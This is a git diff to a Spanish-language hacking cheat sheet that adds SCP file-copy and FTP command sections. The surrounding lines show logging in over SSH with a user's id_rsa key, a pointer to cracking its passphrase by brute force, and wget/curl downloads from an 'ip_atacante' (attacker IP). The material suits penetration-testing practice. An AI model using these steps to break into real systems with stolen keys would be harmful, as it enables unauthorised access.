@@ -10,6 +10,7 @@
 - [SSH](#ssh)
 - [Networking](#net)
 - [Compartir ficheros entre maquinas](#comp)
+- [Comandos FTP](#ftp)
 
 
 
@@ -134,13 +135,19 @@
 * ssh -p user@host (indicar puerto)
 ```
 
-## Conexion SSH con id_rsa
+#### Conexion SSH con id_rsa
 
 Teniendo el fichero id_rsa del usuario podemos realizar una conexión. En ocasiones no necesitamos contraseña. En caso de que sí, se puede intentar crackear con [Ataques fuerza bruta](4%20-%20Hacking%20genérico/Ataques%20fuerza%20bruta.md)
 ```bash
 ssh <usuario>@<ip> -i id_rsa
 ```
 <a name="net"></a>
+##### Copiar ficheros con SSH por SCP
+```bash
+scp <origen> <destino>
+"SUBIR FICHEROS" scp /home/kali/file.txt usuario@servidor:/ruta
+"DESCARGAR FICHEROS" scp usuario@servidor:/file.txt /home/kali.file.txt
+```
 ## Networking
 ```bash
 * ip addr show (ver ip)
@@ -165,4 +172,15 @@ wget <http://ip_atacante/recurso>
 otra opción sería
 ```bash
 curl <http://ip_atacante/recurso> -o recurso
+```
+
+### FTP
+<a name="ftp"></a>
+```bash
+ftp <ip>
+ftp user@ip
+get <fichero>
+mget *
+put <fichero>
+
 ```
